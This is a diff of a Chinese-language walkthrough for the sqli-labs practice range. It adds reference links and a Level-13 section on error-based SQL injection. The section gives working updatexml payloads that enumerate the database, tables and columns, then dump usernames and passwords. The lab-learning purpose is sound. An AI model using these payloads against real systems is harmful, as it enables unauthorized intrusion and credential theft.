@@ -3,6 +3,8 @@
 # sql-labs
 
 + 参考通关秘籍：[sqli-labs 1-65 通关讲解](https://blog.csdn.net/dreamthe/article/details/123795302?ops_request_misc=%7B%22request%5Fid%22%3A%22170443063816800227461809%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170443063816800227461809&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123795302-null-null.142^v99^control&utm_term=sqli-labs通关&spm=1018.2226.3001.4187)
++ 参考通关秘籍：[ Sqli-labs1~65关 通关详解 解题思路+解题步骤+解析_sqlilabs靶场1–65过关](https://blog.csdn.net/Jayjay___/article/details/132081414?ops_request_misc=%7B%22request%5Fid%22%3A%22171120104816800215076877%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171120104816800215076877&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-132081414-null-null.142^v99^pc_search_result_base4&utm_term=sqli-labs通关&spm=1018.2226.3001.4187)
++ 参考通关秘籍：[Sqli-lab教程-史上最全详解（1-22通关）](https://blog.csdn.net/qq_52364123/article/details/130061490?ops_request_misc=%7B%22request%5Fid%22%3A%22171120104816800215076877%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171120104816800215076877&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-5-130061490-null-null.142^v99^pc_search_result_base4&utm_term=sqli-labs通关&spm=1018.2226.3001.4187)
 
 
 
@@ -1632,5 +1634,124 @@ http://localhost/sqli-labs/Less-2/
 
 
 
-### Level-13
+### Level-13 POST盲注 回显报错
 
++ 首先进入第十三关，页面如下
+
+![Less-13_1](./img/Less-13_1.PNG)
+
+
+
++ 使用`updatexml`报错注入
+
+~~~ tex
+UPDATEXML (XML_document, XPath_string, new_value)
+	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+	第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+	第三个参数：new_value，String格式，替换查找到的符合条件的数据
+作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值
+
+当我们XPath_string语法报错时候就会报错，updatexml()报错注入和extractvalue()报错注入基本差不多
+~~~
+
+
+
++ 输入1，页面反应如下没有异常信息
+
+![Less-13_2](./img/Less-13_2.PNG)
+
+
+
++ 注入`1"`，页面正常没有其他错误
+
+![Less-13_4](./img/Less-13_4.PNG)
+
+
+
++ 注入`1'`，页面发生错误，说明`sql`语句是单引号且有括号
+
+![Less-13_3](./img/Less-13_3.PNG)
+
+
+
++ 注入如下语句判断是否存在`sql`注入
+
+~~~ shell
+1') or 1=1 # 
+~~~
+
+![Less-13_5](./img/Less-13_5.PNG)
+
+由上图，可知确实存在`sql`注入
+
+
+
++ 注入如下语句爆破字段数
+
+~~~ shell
+1') order by 3#
+~~~
+
+![Less-13_7](./img/Less-13_7.PNG)
+
+有报错回显，说明字段数是3
+
+
+
+再注入如下语句爆破字段数
+
+~~~ shell
+1') order by 2#
+~~~
+
+![Less-13_8](./img/Less-13_8.PNG)
+
+没有报错回显，说明字段数是2
+
+
+
++ 爆破数据库名
+
+~~~ shell
+1') union select 1,updatexml(1,concat(0x7e,database(),0x7e),1) #
+~~~
+
+![Less-13_9](./img/Less-13_9.PNG)
+
+爆破出数据库名是`security`
+
+
+
++ 注入如下语句爆破数据表名
+
+~~~ shell
+1') union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),0x7e),1)#
+~~~
+
+![Less-13_10](./img/Less-13_10.PNG)
+
+爆破出所有的数据表：`emails,referers,uagents,users`
+
+
+
++ 注入如下语句爆破列名
+
+~~~ shell
+1') union select 1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),0x7e),1)#
+~~~
+
+![Less-13_11](./img/Less-13_11.PNG)
+
+爆破出列名：`id,username,password`
+
+
+
++ 注入如下语句爆破出所有数据
+
+~~~ shell
+1') union select 1,updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1)#
+~~~
+
+![Less-13_12](./img/Less-13_12.PNG)
+
+爆破出所有数据：`DumbDumb,AngelinaI-kill-you,Dum`
